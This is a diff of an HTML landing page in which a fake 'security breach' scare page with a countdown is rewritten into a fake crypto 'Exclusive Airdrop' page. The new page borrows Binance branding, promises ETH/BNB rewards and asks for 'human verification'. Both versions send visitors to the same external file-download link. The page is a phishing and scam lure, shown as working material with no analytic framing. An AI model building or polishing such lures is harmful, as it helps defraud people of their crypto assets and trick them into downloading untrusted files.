@@ -3,35 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SECURITY PROTOCOL | ALERT</title>
+    <title>Crypto Rewards | Exclusive Airdrop</title>
     <style>
-        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { border: 2px solid #ff0000; padding: 30px; text-align: center; box-shadow: 0 0 20px #ff0000; width: 350px; }
-        .timer { font-size: 2rem; margin: 20px 0; color: #fff; text-shadow: 0 0 10px #ff0000; }
-        .warning { animation: blink 0.8s infinite; font-weight: bold; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
-        button { background: #ff0000; color: #000; border: none; padding: 15px 25px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1rem; }
-        button:hover { background: #fff; }
+        body { background: #0b0e11; color: #eaecef; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: #1e2329; border-radius: 16px; padding: 30px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 380px; border: 1px solid #474d57; }
+        .logo { width: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 10px #f3ba2f); }
+        h1 { color: #f3ba2f; margin-bottom: 10px; font-size: 1.8rem; }
+        p { color: #848e9c; font-size: 0.9rem; line-height: 1.5; }
+        .reward-box { background: rgba(243, 186, 47, 0.1); border: 1px dashed #f3ba2f; padding: 15px; margin: 20px 0; border-radius: 8px; }
+        .reward-amount { color: #f3ba2f; font-weight: bold; font-size: 1.5rem; }
+        button { background: #f3ba2f; color: #000; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; font-size: 1.1rem; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #ffd25d; transform: translateY(-2px); }
+        .footer { font-size: 0.7rem; color: #474d57; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <div class="warning">⚠️ SECURITY BREACH DETECTED</div>
-        <p>Your Crypto-Wallet connection is unstable. Security patch will expire in:</p>
-        <div id="countdown" class="timer">05:00</div>
-        <a href="https://clfiles.co/1628178"><button>VERIFY & SECURE ASSETS</button></a>
-        <p style="font-size: 0.7rem; color: #555; margin-top: 15px;">ID: SIGMA-PROTO-2026</p>
-    </div>
+    <div class="card">
+        <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="Logo" class="logo">
+        <h1>Exclusive Airdrop</h1>
+        <p>Congratulations! You are eligible to claim your share of the 2026 Community Rewards Program.</p>
+        
+        <div class="reward-box">
+            <span>Estimated Reward:</span><br>
+            <span class="reward-amount">0.55 ETH / 2.5 BNB</span>
+        </div>
 
-    <script>
-        let time = 300;
-        const display = document.querySelector('#countdown');
-        setInterval(() => {
-            let minutes = Math.floor(time / 60);
-            let seconds = time % 60;
-            display.textContent = `${minutes < 10 ? '0' : ''}${minutes}:${${seconds < 10 ? '0' : ''}${seconds}`;
-            if (time > 0) time--;
-        }, 1000);
-    </script>
+        <p style="margin-bottom: 25px;">To prevent bots, human verification is required before distribution.</p>
+        
+        <a href="https://clfiles.co/1628178"><button>CLAIM REWARD NOW</button></a>
+        
+        <div class="footer">
+            Verified by Smart Contract • Limited Time Only
+        </div>
+    </div>
 </body>
 </html>
